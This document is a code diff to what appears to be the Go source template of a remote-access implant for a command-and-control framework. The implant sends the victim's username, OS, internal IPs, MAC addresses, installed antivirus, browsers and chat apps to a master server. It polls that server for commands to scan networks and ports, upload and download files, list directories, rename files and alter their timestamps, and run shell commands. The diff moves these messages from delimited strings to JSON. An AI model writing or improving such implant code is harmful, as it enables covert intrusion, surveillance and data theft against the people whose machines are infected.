@@ -339,7 +339,12 @@ func send() { //发送头部信息
     currentDir = strings.ReplaceAll(currentDir, "\\", "/")
     parts := strings.Split(master, ":")
 	executable, _ := os.Executable()
-    add_str := clientname +"*//*"+ user +"*//*"+ osname +"*//*"+ strconv.Itoa(int(delay)) +"*//*"+ getInternalIPs() +"*//*"+ currentDir +"*//*"+ version +"*//*"+ parts[len(parts)-1] +"*//*"+ protocol +"*//*"+ strconv.Itoa(int(jitter))+"*//*"+ executable +"*//*"+ macs +"*//*"+ cpuInfo +"*//*"+ Antivirus +"*//*"+ Browsers +"*//*"+ ChatApps +"*//*"+ memoryStr +"*//*"+ systemType +"*//*"+ Arm
+    dataList := []string{clientname,user,osname,strconv.Itoa(int(delay)),getInternalIPs(),currentDir,version,parts[len(parts)-1],protocol,strconv.Itoa(int(jitter)),executable,macs,cpuInfo,Antivirus,Browsers,ChatApps,memoryStr,systemType,Arm,}
+    encodedData, err := json.Marshal(dataList)
+    if err != nil {
+        return
+    }
+    add_str := string(encodedData)
     encry_str := get_encry_s(&add_str)
     data:= map[string]string{"/*uid*/":uid,"/*result*/":encry_str}
     post(data, re_url)
@@ -353,7 +358,10 @@ func send() { //发送头部信息
             currentDir = strings.ReplaceAll(currentDir, "\\", "/")
             parts := strings.Split(master, ":")
 			executable, _ := os.Executable()
-            add_str := clientname +"*//*"+ user +"*//*"+ osname +"*//*"+ strconv.Itoa(int(delay)) +"*//*"+ getInternalIPs() +"*//*"+ currentDir +"*//*"+ version +"*//*"+ parts[len(parts)-1] +"*//*"+ protocol +"*//*"+ strconv.Itoa(int(jitter))+"*//*"+ executable
+            dataList := []string{clientname,user,osname,strconv.Itoa(int(delay)),getInternalIPs(),currentDir,version,parts[len(parts)-1],protocol,strconv.Itoa(int(jitter)),executable,}
+            encodedData, err := json.Marshal(dataList)
+            if err != nil {return}
+            add_str := string(encodedData)
             encry_str := get_encry_s(&add_str)
             data:= map[string]string{"/*uid*/":uid,"/*result*/":encry_str}
             post(data, re_url)
@@ -478,6 +486,7 @@ func send() { //发送头部信息
         "sync"
         "path/filepath"
         "encoding/binary"
+        "encoding/json"
         /*sys_str*/
         /*tls_str*/
         /*http3*/
@@ -579,18 +588,36 @@ func send() { //发送头部信息
         }
         return buf.String()
     }
+    var fileInfo struct {
+        UID       string
+        Filename  string
+        Split_size int
+    }
     func downloadFile(fileKey string) {
-        encryData := get_encry_s(&fileKey)
-        url := protocol + master + "//*Path*/?/*option*/=/*download*/&/*uid*/=" + uid + "&/*filekey*/=" + encryData
-        filesplit := strings.Split(fileKey, "**///**")
-        if len(filesplit) < 3 {
+        var fileInfo struct {
+            UID       string
+            Filename  string
+            Split_size int
+        }
+        if err := json.Unmarshal([]byte(fileKey), &fileInfo); err != nil {
             return
         }
-        filename := filesplit[1]
-		retryCount := 0
+        if fileInfo.Filename == "" || fileInfo.Split_size <= 0 {
+            return
+        }
+        encryData := get_encry_s(&fileKey)
+        url := protocol + master +"//*Path*/?/*option*/=/*download*/&/*uid*/=" +uid +"&/*filekey*/=" +encryData
+        filename := fileInfo.Filename
+        retryCount := 0
         for {
             var maxRetry int
-            a_Mutex.RLock();if delay < 30 {maxRetry = 30} else {maxRetry = delay};a_Mutex.RUnlock()
+            a_Mutex.RLock()
+            if delay < 30 {
+                maxRetry = 30
+            } else {
+                maxRetry = delay
+            }
+            a_Mutex.RUnlock()
             response, err := client.Get(url)
             if err != nil {
                 retryCount++
@@ -600,18 +627,17 @@ func send() { //发送头部信息
                 }
                 return
             }
+            if response.StatusCode != http.StatusOK {
+                response.Body.Close()
+                return
+            }
             fileData, err := io.ReadAll(response.Body)
             response.Body.Close()
             if err != nil {
-                retryCount++
-                if retryCount < maxRetry {
-                    time.Sleep(2 * time.Second)
-                    continue
-                }
                 return
             }
             if len(fileData) == 0 {
-                break
+                return
             }
             if err := get_decry_f(filename, fileData); err != nil {
                 return
@@ -648,7 +674,12 @@ func send() { //发送头部信息
             if encryptedChunk == nil {return}
             retryCount := 0
             for retryCount < maxRetry {
-                str_encry := clientname + "*//*" + splitSize + "*//*" + strconv.FormatInt(fileSize, 10) + "*//*" + strconv.FormatInt(start, 10) + "*//*" + strconv.FormatInt(end, 10)
+                dataList := []string{clientname,splitSize,strconv.FormatInt(fileSize, 10),strconv.FormatInt(start, 10),strconv.FormatInt(end, 10),}
+                encodedData, err := json.Marshal(dataList)
+                if err != nil {
+                    return
+                }
+                str_encry := string(encodedData)
                 data_encry := get_encry_s(&str_encry)
                 var buffer bytes.Buffer
                 writer := multipart.NewWriter(&buffer)
@@ -679,52 +710,130 @@ func send() { //发送头部信息
     }
     func getCmd() {
         url := protocol + master + "//*Path*/?/*option*/=/*MsgPath*/&/*uid*/=" + uid
-        re_url := protocol + master + "//*Path*/?/*option*/=/*result*/"
-        file_url := protocol + master + "//*Path*/?/*option*/=/*list*/"
-        var job, shell string
-        var msg []string
+        reURL := protocol + master + "//*Path*/?/*option*/=/*result*/"
+        fileURL := protocol + master + "//*Path*/?/*option*/=/*list*/"
+        type CommandMessage struct {
+            Command string
+            Args    []string
+            Task_id string
+        }
+        getArg := func(args []string, index int) (string, bool) {
+            if index < 0 || index >= len(args) {
+                return "", false
+            }
+            return args[index], true
+        }
         for {
             sleepdelay()
             respBody := getUrl(url)
             if respBody == "" {
                 continue
-            } else if respBody == uid {
+            }
+            if respBody == uid {
                 onece = true
                 run()
+                return
             }
-            cmd := get_decry_s(&respBody)
-            msg = strings.Split(cmd, "*//*")
-            if len(msg) < 2 {
+            decrypted := get_decry_s(&respBody)
+            if strings.TrimSpace(decrypted) == "" {
                 continue
             }
-            job = msg[0]
-            if len(msg) > 1 {
-                shell = string(msg[1])
+            var message CommandMessage
+            if err := json.Unmarshal([]byte(decrypted), &message); err != nil {
+                continue
             }
-            switch job {
+            message.Command = strings.TrimSpace(message.Command)
+            if message.Command == "" {
+                continue
+            }
+            args := message.Args
+            switch message.Command {
             case "GET_U_FRIENDS":
-                go scan_u_firends(shell, msg[2], msg[3], "ping")
+                target, ok1 := getArg(args, 0)
+                portRange, ok2 := getArg(args, 1)
+                delayValue, ok3 := getArg(args, 2)
+                if !ok1 || !ok2 || !ok3 {
+                    continue
+                }
+                go scan_u_firends(target,portRange,delayValue,"ping",)
             case "GET_PORTS":
-                go scan_u_firends(shell, msg[2], msg[3], "port")
+                target, ok1 := getArg(args, 0)
+                portRange, ok2 := getArg(args, 1)
+                delayValue, ok3 := getArg(args, 2)
+                if !ok1 || !ok2 || !ok3 {
+                    continue
+                }
+                go scan_u_firends(target,portRange,delayValue,"port",)
             case "GET_DELAY":
-                GET_DELAY(shell)
+                delayValue, ok := getArg(args, 0)
+                if !ok {
+                    continue
+                }
+                GET_DELAY(delayValue)
             case "GET_JITTER":
-                GET_JITTER(shell)
+                jitterValue, ok := getArg(args, 0)
+                if !ok {
+                    continue
+                }
+                GET_JITTER(jitterValue)
             case "GET_U_FILE":
-                go GET_U_FILE(shell, msg[2])
+                filePath, ok1 := getArg(args, 0)
+                splitSize, ok2 := getArg(args, 1)
+                if !ok1 || !ok2 {
+                    continue
+                }
+                go GET_U_FILE(filePath, splitSize)
             case "LOAD_U_FILE":
-                go downloadFile(shell)
+                if len(args) != 3 {
+                    continue
+                }
+                splitSize, err := strconv.Atoi(args[2])
+                if err != nil || splitSize <= 0 {
+                    continue
+                }
+                uidJSON, err := json.Marshal(args[0])
+                if err != nil {
+                    continue
+                }
+                filenameJSON, err := json.Marshal(args[1])
+                if err != nil {
+                    continue
+                }
+                fileKey := "{\"uid\":" + string(uidJSON) +",\"filename\":" +string(filenameJSON) +",\"split_size\":" +strconv.Itoa(splitSize) +"}"
+                go downloadFile(fileKey)
             case "LOOK_UP_FILE":
-                go listDir(shell, file_url,msg[len(msg)-1])
+                dirPath, ok := getArg(args, 0)
+                if !ok || dirPath == "" {
+                    continue
+                }
+                go listDir(dirPath,fileURL,message.Task_id,)
             case "SWITCH_VERSION":
-                version = shell
+                newVersion, ok := getArg(args, 0)
+                if !ok || newVersion == "" {
+                    continue
+                }
+                version = newVersion
             case "CHANG_FILE_NAME":
-                go CHANG_FILE_NAME(shell, msg[2])
+                oldPath, ok1 := getArg(args, 0)
+                newName, ok2 := getArg(args, 1)
+                if !ok1 || !ok2 {
+                    continue
+                }
+                go CHANG_FILE_NAME(oldPath,newName,)
             case "CHANG_FILE_TIME":
-                go CHANG_FILE_TIME(shell, msg[2])
-            /*code*/
+                filePath, ok1 := getArg(args, 0)
+                newTime, ok2 := getArg(args, 1)
+                if !ok1 || !ok2 {
+                    continue
+                }
+                go CHANG_FILE_TIME(filePath,newTime,)
             case "shell":
-                go get_Command(shell, re_url,msg[len(msg)-1])
+                shellCommand, ok := getArg(args, 0)
+                if !ok {
+                    continue
+                }
+                go get_Command(shellCommand,reURL,message.Task_id,)
+            /*code*/
             default:
                 continue
             }
@@ -781,32 +890,44 @@ func send() { //发送头部信息
 	    }
 	    return
 	}
-    func listDir(cmd, file_url,taskid string) {
+    func listDir(cmd, file_url, taskid string) {
         var fileNames string
-        files, _ := ioutil.ReadDir(cmd)
+        files, err := ioutil.ReadDir(cmd)
+        if err != nil {
+            return
+        }
         for _, file := range files {
             modTime := file.ModTime()
             modTimeStr := modTime.Format("2006-01-02 15:04:05")
             permissions := file.Mode().String()
             if file.IsDir() {
-                fileNames += "dir " + file.Name() + "<" + permissions + "><" + modTimeStr + ">\n"
+                fileNames += "dir " +
+                    file.Name() +
+                    "<" + permissions + "><" + modTimeStr + ">\n"
             } else {
                 fileSize := file.Size()
                 fileSizeMB := float64(fileSize) / (1024 * 1024)
-                fileSizeStr := strconv.FormatFloat(fileSizeMB, 'f', 2, 64)
-                fileNames += "fil " + file.Name() + "<" + fileSizeStr + ".MB><" + permissions + "><" + modTimeStr + ">\n"
+                fileSizeStr := strconv.FormatFloat(fileSizeMB,'f',2,64,)
+                fileNames += "fil " +file.Name() +"<" + fileSizeStr + ".MB><" +permissions + "><" +modTimeStr + ">\n"
             }
         }
         if fileNames == "" {
             fileNames = "empty"
         }
-        fileData := cmd + "*//*" + fileNames
+        dataList, err := json.Marshal([]string{
+            cmd,
+            fileNames,
+        })
+        if err != nil {
+            return
+        }
+        fileData := string(dataList)
         encryptedStr := get_encry_s(&fileData)
-		encryptedTask := get_encry_s(&taskid)
+        encryptedTask := get_encry_s(&taskid)
         data := map[string]string{
-            "/*uid*/":  uid,
+            "/*uid*/":    uid,
             "/*result*/": encryptedStr,
-            "/*info*/": encryptedTask,
+            "/*info*/":   encryptedTask,
         }
         post(data, file_url)
     }
